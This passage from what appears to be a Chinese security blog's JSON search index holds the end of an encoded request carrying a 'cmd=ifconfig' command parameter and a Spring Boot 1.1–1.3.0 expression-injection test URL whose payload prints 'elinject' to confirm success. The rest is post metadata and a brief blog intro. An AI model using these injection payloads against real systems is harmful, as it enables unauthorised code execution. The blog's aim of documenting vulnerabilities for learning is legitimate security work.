egrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR&#x2F;h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE&#x2F;weJ20W3QKj6nIz&#x2F;EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ&#x2F;zaHx&#x2F;GzAJakSRQ5YbKQ&#x2F;W&#x2F;OzkokDG3M79KSCtx2jN92PtISucY%3D&amp;;cmd&#x3D;ifconfig Spring Boot框架表达式注入漏洞影响Spring Boot版本从1.1-1.3.0 http:&#x2F;&#x2F;localhost:8555&#x2F;test.php?id&#x3D;$&#123;new%20java.lang.String(new%20byte[]&#123;101, 108, 105, 110, 106, 101, 99, 116 &#125;)&#125; 内容中出现 elinject就是注入成功","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"新的开始！","slug":"新的开始！","date":"2018-09-17T16:32:10.000Z","updated":"2020-04-24T07:39:04.000Z","comments":true,"path":"2018/09/新的开始！/","link":"","permalink":"https://misakikata.github.io/2018/09/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B%EF%BC%81/","excerpt":"","text":"记录自己某些时候的学习，和某些突发奇想。简而言之就是为了防止忘记某些自己需要的东西。","categories":[],"tags":[]}]}